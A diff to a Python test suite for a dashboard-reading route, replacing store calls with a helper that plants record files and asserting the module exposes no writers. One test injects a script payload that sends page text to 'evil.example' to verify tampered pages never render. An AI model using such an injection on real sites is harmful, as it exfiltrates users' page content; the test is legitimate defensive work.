@@ -58,6 +58,31 @@ def _manifest(**over):
     return raw
 
 
+def _record(slug=SLUG, *, template_id="fixture-board", version=1, html=PAGE, manifest=None):
+    """Put one stored record on disk, so a read has something to answer with.
+
+    Written by the TEST rather than through a store call, because what these cases are
+    about is the READ: the route decodes a record and derives its state, and a record
+    is a file under the member's own space whatever put it there. Writing it here also
+    lets a case plant a record no writer would produce -- one naming a template the
+    catalog does not serve, or carrying a page somebody appended a script to -- which
+    is exactly the input the render gate exists for.
+    """
+    directory = instance.instance_dir(slug)
+    directory.mkdir(parents=True, exist_ok=True)
+    body = {
+        "schema": instance.SCHEMA_VERSION,
+        "slug": slug,
+        "instance_version": version,
+        "template": {"id": template_id, "version": 1},
+        "html": html,
+        "manifest": _manifest() if manifest is None else manifest,
+        "updated_ms": 1,
+    }
+    (directory / "instance.json").write_text(json.dumps(body), encoding="utf-8")
+    return body
+
+
 @pytest.fixture(autouse=True)
 def _env(tmp_path, _floor_monkeypatch):
     """One fixture template, an isolated home, and the member checks stubbed.
@@ -166,9 +191,7 @@ async def test_an_empty_record_with_no_default_is_not_composed(caplog):
 
 async def test_the_body_is_the_shape_the_contract_fixes():
     async with _client() as client:
-        # Adopted through the store: the adopt ROUTE is not part of this layer, and
-        # what these cases need is an instance to read, not the route that made one.
-        instance.adopt(SLUG, "fixture-board")
+        _record()
         body = await (await client.get(_q(""))).json()
         assert set(body) >= {"instance_version", "template", "html", "manifest", "state"}
         assert body["template"] == {"id": "fixture-board", "version": 1}
@@ -249,9 +272,7 @@ async def test_a_live_dashboard_comes_back_with_its_values_filled_in(monkeypatch
         lambda slot, name: SimpleNamespace(value={"fields": {"phase": {"value": "reviewing"}}}),
     )
     async with _client() as client:
-        # Adopted through the store: the adopt ROUTE is not part of this layer, and
-        # what these cases need is an instance to read, not the route that made one.
-        instance.adopt(SLUG, "fixture-board")
+        _record()
         body = await (await client.get(_q(""))).json()
     rendered = body["rendered_html"]
     assert body["html"] == PAGE
@@ -376,9 +397,7 @@ async def test_a_stale_copy_is_still_composed_with_its_values(monkeypatch, tmp_p
 
     monkeypatch.setattr(dashboard_feed, "DashboardFeed", FakeFeed)
     async with _client() as client:
-        # Adopted through the store: the adopt ROUTE is not part of this layer, and
-        # what these cases need is an instance to read, not the route that made one.
-        instance.adopt(SLUG, "fixture-board")
+        _record()
         # The registry moves on, which is what makes the stored copy stale.
         builtin = tmp_path / "builtin" / "fixture-board"
         builtin.joinpath("manifest.json").write_text(
@@ -404,9 +423,7 @@ async def test_a_page_whose_values_cannot_be_read_still_answers_without_them(mon
 
     monkeypatch.setattr(dashboard_feed, "DashboardFeed", boom)
     async with _client() as client:
-        # Adopted through the store: the adopt ROUTE is not part of this layer, and
-        # what these cases need is an instance to read, not the route that made one.
-        instance.adopt(SLUG, "fixture-board")
+        _record()
         resp = await client.get(_q(""))
         body = await resp.json()
     assert resp.status == 200 and body["state"] == "live" and "rendered_html" not in body
@@ -612,6 +629,21 @@ class TestTheRefusalMapping:
         assert resp.status == 404
         assert json.loads(resp.text)["code"] == "template_not_found"
 
+    def test_a_record_that_will_not_decode_is_an_error_and_not_a_refusal(self):
+        """The reader's own exception class, which separates the two mappings above.
+
+        Planted directly, because no writer in the reader module could produce such a
+        record.
+        """
+        directory = instance.instance_dir(SLUG)
+        directory.mkdir(parents=True, exist_ok=True)
+        (directory / "instance.json").write_text("{ not json", encoding="utf-8")
+        with pytest.raises(instance.InstanceError):
+            instance.read(SLUG)
+        assert not isinstance(
+            instance.InstanceError("x"), instance.InstanceRefused
+        ), "an unreadable record must not map to the caller's-input answer"
+
     def test_anything_else_is_this_gateways_fault(self):
         resp = routes._refusal(OSError("the disk went away"))
         assert resp.status == 500
@@ -785,7 +817,7 @@ class TestOneCrewmateResolvesToOneSlug:
         _floor_monkeypatch.setattr(routes, "_member_names_for_slug", lambda cfg, slug: ["Atlas"])
 
         # The member's own write, under the slug its session resolves to.
-        instance.adopt(owned, "fixture-board", session_id="")
+        _record(owned)
         async with _client() as c:
             resp = await c.get(f"/api/members/{owned}/dashboard?member=atlas")
             assert resp.status == 200, await resp.text()
@@ -836,7 +868,7 @@ class TestTheExecutedPageComesFromTheCatalog:
     def test_a_script_appended_to_the_stored_page_never_reaches_the_frame(self) -> None:
         """THE FINDING. The rendered body is the catalog's page, not the record's."""
         injected = '<script>fetch("https://evil.example/" + document.body.innerText)</script>'
-        instance.adopt(SLUG, "fixture-board", session_id="")
+        _record()
         self._tampered(SLUG, injected)
 
         # The record really does carry it now, which is what makes the assertion below
@@ -856,7 +888,7 @@ class TestTheExecutedPageComesFromTheCatalog:
         `_render` composes, so a case reading only its output cannot tell "the
         catalog's page" from "the record's page with the script stripped".
         """
-        instance.adopt(SLUG, "fixture-board", session_id="")
+        _record()
         self._tampered(SLUG, "<p>appended</p>")
         page = routes._trusted_page(SLUG, instance.read(SLUG))
         assert page == PAGE, "the executed page is not the catalog's"
@@ -868,7 +900,7 @@ class TestTheExecutedPageComesFromTheCatalog:
         Falling back to the stored page here would hand the frame exactly the bytes
         this check exists to decline -- so an unknown id draws the unavailable state.
         """
-        instance.adopt(SLUG, "fixture-board", session_id="")
+        _record()
         path = routes.instance.instance_dir(SLUG) / "instance.json"
         raw = json.loads(path.read_text(encoding="utf-8"))
         raw["template"]["id"] = "not-a-shipped-template"
@@ -876,7 +908,7 @@ class TestTheExecutedPageComesFromTheCatalog:
         assert routes._trusted_page(SLUG, instance.read(SLUG)) is None
 
     def test_a_record_naming_no_template_is_refused(self) -> None:
-        instance.adopt(SLUG, "fixture-board", session_id="")
+        _record()
         record = instance.read(SLUG)
         object.__setattr__(record, "template_id", "")
         assert routes._trusted_page(SLUG, record) is None
@@ -887,49 +919,40 @@ class TestTheExecutedPageComesFromTheCatalog:
         It is not the gate any more -- the catalog is -- but it costs nothing and
         turns away a record whose own label already says it must not run.
         """
-        instance.adopt(SLUG, "fixture-board", session_id="")
+        _record()
         record = instance.read(SLUG)
         object.__setattr__(record, "manifest", {**dict(record.manifest), "source": "shared"})
         assert routes._trusted_page(SLUG, record) is None
 
 
-class TestAStoredPageCannotBeEdited:
-    """`edit` kept the template id and version while replacing the page.
+class TestNothingHereWritesARecord:
+    """The module this route reads through is a READER, structurally.
 
-    That made a record saying `builtin` over bytes nobody reviewed -- the same hole
-    from the writer's side rather than the reader's.
+    A record saying ``builtin`` over bytes nobody reviewed is what a page editor
+    produces, and the gate above turns such a record away at render. This closes the
+    other side of it: there is no writer in the module at all, so the record the
+    reader decodes cannot have been put there by this gateway.
+
+    Asserted against the module's own surface rather than by driving a call, because
+    the claim is an ABSENCE and a call cannot demonstrate one. The names are listed
+    explicitly so a writer added back under any of them fails here.
     """
 
-    def test_an_html_edit_on_a_builtin_is_refused(self) -> None:
-        instance.adopt(SLUG, "fixture-board", session_id="")
-        with pytest.raises(instance.InstanceRefused) as refused:
-            instance.edit(SLUG, html=PAGE_EDITED, session_id="")
-        assert str(refused.value) == instance.EDITED_PAGE_REFUSAL
-        assert "cannot be edited" in str(refused.value)
-        # NOTHING was written: no new version, and the page on disk is untouched.
-        after = instance.read(SLUG)
-        assert after.instance_version == 1
-        assert after.html == PAGE
+    def test_the_reader_exposes_no_writing_entry_point(self) -> None:
+        for name in ("adopt", "edit", "rollback", "stage_preview", "apply_preview"):
+            assert not hasattr(instance, name), f"instance.{name} writes a record"
 
-    def test_the_refusal_names_what_to_do_instead(self) -> None:
-        """A caller that cannot edit the page has to be told where pages come from."""
-        for needle in ("dashboard_templates", "dashboard_rollback", "manifest alone"):
-            assert needle in instance.EDITED_PAGE_REFUSAL, needle
+    def test_the_preview_READER_is_the_one_preview_name_that_stays(self) -> None:
+        """And it is a reader: the staging half is in the list above.
 
-    def test_an_html_edit_is_refused_even_beside_a_manifest(self) -> None:
-        """The pair is not a loophole: the page half still decides."""
-        instance.adopt(SLUG, "fixture-board", session_id="")
-        with pytest.raises(instance.InstanceRefused):
-            instance.edit(SLUG, html=PAGE_EDITED, manifest=_manifest(), session_id="")
-        assert instance.read(SLUG).instance_version == 1
-
-    def test_a_manifest_only_edit_is_still_allowed(self) -> None:
-        """It can name fields and fold paths, so the worst it draws is an empty cell.
-
-        And the parity rule refuses even that, so the capability stays.
+        Spelled out so the absence list is not read as "no preview name survives".
+        ``staged_preview`` has no writer left, so it answers ``None`` for every slug --
+        checked here rather than asserted of the name alone, because an absent writer
+        is the whole reason the function is still reachable.
         """
-        instance.adopt(SLUG, "fixture-board", session_id="")
-        edited = instance.edit(SLUG, manifest={**_manifest(), "title": "Retitled"}, session_id="")
-        assert edited.instance_version == 2
-        assert edited.manifest["title"] == "Retitled"
-        assert edited.html == PAGE, "a manifest edit moved the page"
+        assert instance.staged_preview(SLUG) is None
+
+    def test_the_reader_still_exposes_the_read(self) -> None:
+        """The positive control: the absence above is not an empty module."""
+        assert callable(instance.read)
+        assert _record() and instance.read(SLUG).html == PAGE
